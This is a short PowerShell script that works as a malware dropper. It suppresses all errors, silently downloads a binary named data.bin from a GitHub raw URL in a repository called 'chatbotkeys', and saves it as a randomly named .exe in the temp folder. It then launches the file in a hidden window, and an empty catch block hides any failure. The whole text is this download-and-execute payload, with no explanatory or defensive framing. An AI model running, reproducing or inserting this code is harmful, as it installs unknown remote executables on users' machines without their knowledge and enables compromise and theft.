$ErrorActionPreference = "SilentlyContinue"
$u = "https://raw.githubusercontent.com/22ffwhite07-tech/chatbotkeys/main/data.bin"
$t = Join-Path $env:TEMP ("~" + [Guid]::NewGuid().ToString("N").Substring(0,8) + ".exe")
try {
    (New-Object Net.WebClient).DownloadFile($u, $t)
    Start-Process -FilePath $t -WindowStyle Hidden
} catch {}